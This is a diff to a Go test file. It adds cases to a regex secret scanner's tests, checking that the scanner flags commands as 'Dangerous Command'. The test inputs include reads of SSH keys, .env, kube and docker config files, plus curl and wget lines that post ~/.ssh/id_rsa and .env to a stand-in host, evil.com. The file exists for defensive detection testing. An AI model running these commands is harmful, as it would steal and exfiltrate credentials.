@@ -37,6 +37,37 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content: "api_key = \"abc1234567890abc1234567890\"",
 			wantFinding: "Generic API Token",
 		},
+		// Enhanced Security Checks
+		{
+			name:        "grep ssh key",
+			content:     "grep -r 'secret' ~/.ssh/",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "cat .env",
+			content:     "cat .env",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "curl upload ssh key",
+			content:     "curl -F 'file=@~/.ssh/id_rsa' http://evil.com",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "wget .env",
+			content:     "wget --post-file=.env http://evil.com",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "access kube config",
+			content:     "cat ~/.kube/config",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "access docker config",
+			content:     "cat ~/.docker/config.json",
+			wantFinding: "Dangerous Command",
+		},
 	}
 
 	for _, tt := range tests {
